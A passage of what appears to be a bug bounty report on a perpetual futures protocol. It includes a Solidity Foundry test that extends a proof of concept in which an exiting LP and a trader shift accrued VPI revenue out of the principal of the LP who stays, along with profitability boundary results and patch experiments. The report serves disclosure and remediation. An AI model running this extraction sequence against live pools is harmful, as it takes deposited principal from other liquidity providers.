| 60% (main test) | 380,901.939600 | 725.429987 | +130.535261 | -282.895366 |
| 50% | 380,901.939600 | 725.429987 | +57.992441 | -210.352832 |
| 40% | 380,901.939600 | 725.429987 | -14.550415 | -137.810167 |
| 60%, half size | 190,450.969800 | 181.357496 | -43.546566 | -32.633776 |

The 40% row is the lower bound on the attacker's share: the round-trip fees exceed its share of the revenue, so the sequence only harms the other LP. The half-size row shows the same for position size, because accrued VPI grows with the square of skew while fees grow linearly. In every row the LP that stayed loses deposited principal.

File: `packages/perps/test/bounty/goal/VpiNavExitRefundVariants.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {VpiNavExitRefundPoC} from "./VpiNavExitRefundPoC.t.sol";
import {console2} from "forge-std/console2.sol";

/// Where the transfer is profitable for the exiting LP, and where it only harms the LP that stays.
contract VpiNavExitRefundVariants is VpiNavExitRefundPoC {
    /// One cycle with an arbitrary split and long size. Returns the signed USDG result for each side.
    function _cycle(
        uint256 exitingPrincipal,
        uint256 remainingPrincipal,
        uint256 size
    ) internal returns (int256 exitingDelta, int256 remainingDelta) {
        _fundJuniorThroughRouter(EXITING_LP, exitingPrincipal);
        _fundJuniorThroughRouter(REMAINING_LP, remainingPrincipal);
        _fundTrader(TRADER, TRADER_PRINCIPAL);
        uint256 exitingStart = exitingPrincipal + TRADER_PRINCIPAL;

        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN() + 1);
        uint256 shares = juniorVault.maxRequestRedeem(EXITING_LP);
        vm.prank(EXITING_LP);
        uint256 redeemId = juniorVault.requestRedeem(shares, EXITING_LP, EXITING_LP);
        vm.warp(pool.lpEpochStart(redeemId));

        _routerOrder(TRADER, size, TRADER_MARGIN, false);
        (,,,,,, int256 accruedVpi) = engine.positions(TRADER);
        console2.log("accrued VPI", uint256(accruedVpi));

        _settleLpEpochWithMark();
        assertEq(juniorVault.claimableRedeemRequest(redeemId, EXITING_LP), shares, "LP exit not fully funded");
        vm.prank(EXITING_LP);
        juniorVault.claimRedeem(redeemId, shares, EXITING_LP, EXITING_LP);

        _routerOrder(TRADER, size, 0, true);
        assertFalse(engine.degradedMode(), "degraded mode must stay off");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no trader claim");

        _withdrawClearinghouse(TRADER);
        _withdrawClearinghouse(KEEPER);
        exitingDelta = int256(_exitingSideAssets()) - int256(exitingStart);
        remainingDelta = int256(_redeemJunior(REMAINING_LP)) - int256(remainingPrincipal);
        console2.logInt(exitingDelta);
        console2.logInt(remainingDelta);
    }

    /// A 50% LP share still profits.
    function test_boundary_share50() public {
        (int256 exitingDelta, int256 remainingDelta) = _cycle(500_000e6, 500_000e6, SIZE);
        assertGt(exitingDelta, 0, "profitable at a 50% share");
        assertLt(remainingDelta, 0, "the LP that stays loses principal");
    }

    /// A 40% LP share does not cover the round-trip fees, so it is griefing rather than extraction.
    function test_boundary_share40() public {
        (int256 exitingDelta, int256 remainingDelta) = _cycle(400_000e6, 600_000e6, SIZE);
        assertLt(exitingDelta, 0, "unprofitable at a 40% share");
        assertLt(remainingDelta, 0, "the LP that stays still loses principal");
    }

    /// The accrued VPI grows with the square of skew while the fees grow linearly, so a half-size long at the
    /// same 60% share does not pay for itself. The attack needs a near-maximum-skew position.
    function test_boundary_halfSizeLongIsUnprofitable() public {
        (int256 exitingDelta, int256 remainingDelta) = _cycle(600_000e6, 400_000e6, SIZE / 2);
        assertLt(exitingDelta, 0, "unprofitable at half the skew");
        assertLt(remainingDelta, 0, "the LP that stays still loses principal");
    }
}
```

Command:

```
cd packages/perps && forge test --match-path 'test/bounty/goal/VpiNavExitRefundVariants.t.sol' -vv
```

All six tests pass, including the three inherited from the main file.

Source-level check: treating the refundable amount as a pool liability makes the proof of concept fail. In a throwaway copy, `CfdEngine` keeps an aggregate of `max(vpiAccrued, 0)` maintained where positions are written and deleted (`settlementWritePosition`, `settlementDeletePosition`), and `CfdEngineProtocolLens` adds that aggregate to `snapshot.traderClaimBalanceAssets`. The main test then fails at its first economic assertion, `the exit prices in a share of the VPI revenue: 599999999980 <= 600000000000`, because the exiting LP no longer prices in the VPI. Running the same sequence to the end under that change:

| Party | Unpatched | Patched |
|---|---:|---:|
| Exiting LP redeemed, on a 600,000 deposit | 600,435.257537 | 599,999.999980 |
| Exiting side final, on 700,000 funded | 700,130.535261 | 699,695.277705 |
| Remaining LP redeemed, on a 400,000 deposit | 399,717.104634 | 400,152.361103 |

Patched, the exiting side loses 304.722295 USDG, which is its two execution fees, and the LP that stays gains 152.361103 USDG, which is the retained close fee. The main test and the three boundary tests all fail, each on an assertion that encodes the transfer: at a 50% share the exiting side loses 304.722190 USDG instead of earning 57.992441 USDG, and at a 40% share the LP that stays gains 152.361055 USDG instead of losing 137.810167 USDG. The control test and the depth test still pass, and the aggregate returns to zero once the position is deleted. This check modifies in-scope contracts and is not part of the test files.

Two narrower fixes were tried and do not work, which is why the remediation below targets the share price:

- Adding the same aggregate to `supplementalReservedAssets`, so the amount is reserved from withdrawal cash, leaves every measured value unchanged. Free assets exceed the redemption by 18,437.978001 USDG at this size, so that reservation never binds.
- Rerouting the open's VPI inflow into the existing `ClaimantInflowKind.Recapitalization` bucket fails earlier: `HousePool.recordClaimantInflow` rejects that kind from any caller other than the engine itself (`src/HousePool.sol:636`), and the opening order fails to execute.

These checks were run against a local copy and the source tree was restored afterwards. The repository's own `test/perps/accounting` suite was not run to completion against the patch, so the change is not regression tested.
